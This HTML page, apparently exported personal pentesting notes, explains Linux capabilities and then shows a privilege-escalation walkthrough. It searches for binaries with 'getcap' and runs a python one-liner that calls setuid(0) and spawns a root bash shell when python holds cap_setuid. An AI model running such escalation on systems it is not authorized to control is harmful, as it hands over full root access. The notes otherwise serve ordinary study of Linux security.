<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Capabilities</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Capabilities</h1><br /><br /><strong>
      <h3>What are Capabilities in Linux (source: </h3>
    </strong><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">man7.org</a><strong>
      <h3>)</h3>
    </strong><br />• <strong>Start to understand how Linux normally perform permission checks</strong><br /> For the
    purpose of performing permission checks, <span style="text-decoration:underline;">traditional UNIX implementations
      distinguish only two categories of processes</span>: <br /> ◇ <em>privileged</em> processes (whose effective user
    ID is 0, referred to as superuser or root). <br /> These processes bypass all kernel permission checks<br /> ◇
    <em>unprivileged</em> processes (whose effective UID is nonzero).<br /> These processes are subject to full
    permission checking based on the process&#39;s credentials (usually: effective UID, effective GID, and supplementary
    group list).<br />• <strong>Capabilities: divides privileges in single units</strong><br /> Starting with kernel
    2.2, <span style="text-decoration:underline;">Linux divides the privileges traditionally associated with superuser
      into distinct units, known as </span><em><span style="text-decoration:underline;">capabilities</span></em><span
      style="text-decoration:underline;">, which can be independently enabled and disabled</span>. Each one permits some
    operations or behaviors.<br /> Capabilities List: <br /> ▪ CAP_CHOWN → Allow user to make arbitrary change to files
    UIDs and GIDs (full filesystem access)<br /> ▪ CAP_DAC_OVERRIDE → This helps to bypass file read, write and execute
    permission checks (full filesystem access)<br /> ▪ CAP_DAC_READ_SEARCH → This only bypass file and directory
    read/execute permission checks<br /> ▪ CAP_SETUID → Allow changing of the UID (set UID of root in you process)<br />
    ▪ CAP_NET_RAW → Use RAW and PACKET sockets (sniff traffic)<br /> ▪ CAP_SYS_ADMIN → Mount/Unmount filesystems<br /> ▪
    CAP_SYS_PTRACE → Debug processes (inject shellcodes)<br /> ▪ CAP_SYS_MODULE → Insert kernel modules<br /> ▪
    ...<br />• <strong>Why Capabilities are useful</strong><br /> <span style="text-decoration:underline;">Capabilities
      are more secure then SUID</span>. Because of that there is a transition from SUID to Capabilities recently.<br />
    ◇ <span style="text-decoration:underline;">Capabilities values can be assigned independently</span> to processes so
    that to perform a privileged operation, this <span style="text-decoration:underline;">process may only contain the
      privilege necessary, without the need to assume the identity of superuser.</span><br /> ◇ Due to the granularity
    that the capabilities provide and the lack of requirement to acquire root identity, they are a very useful method
    for assigning privileged permissions to specific tasks.<br /><br /><br /><strong>
      <h3>Exploit</h3>
    </strong><br />1. Search for Capabilities<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;getcap&nbsp;-r&nbsp;/&nbsp;2&gt;/dev/null</div>
    </div><br /> <a href=""><img src="images/1858-1.png" alt="images/1858-1.png" /></a><br /> &quot;cap_setuid+ep&quot;
    → capabilities that allow changing of the UID (set UID of root in you process). The +ep means you’re adding the
    capability (“-” would remove it) as Effective and Permitted (source: <a
      href="https://www.insecure.ws/linux/getcap_setcap.html#:~:text=The%20%E2%80%9C%2Bep%E2%80%9D%20means%20you,p%3A%20Permitted" target="_blank">insecure.ws</a>)<br />2.
    Become root with python<br /> Because python in this example has the capability of change our UID, we need only some
    commands that let us become root<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;/usr/bin/python2.6&nbsp;-c&nbsp;&#39;import&nbsp;os;&nbsp;os.setuid(0);&nbsp;os.system(&quot;/bin/bash&quot;)&#39;&nbsp;
      </div>
    </div><br /> <a href=""><img src="images/1858-2.png" alt="images/1858-2.png" /></a><br /><br /><span
      style="text-decoration:underline;">Programs with Capabilities that can let become us root</span>(complete list: <a
      href="https://gtfobins.github.io/#+capabilities" target="_blank">https://gtfobins.github.io/#+capabilities</a>):<br /> ◇
    python<br /> ◇ tar<br /> ◇ openssl<br /> ◇ perl<br /><br /><br /><br /><br />Bibliography:<br />• <a
      href="https://man7.org/linux/man-pages/man7/capabilities.7.html" target="_blank">man7.org</a><br />• <a
      href="https://www.incibe-cert.es/en/blog/linux-capabilities-en" target="_blank">https://www.incibe-cert.es/en/blog/linux-capabilities-en</a><br />•
    <a
      href="https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/" target="_blank">https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/</a>
  </div>
</body>

</html>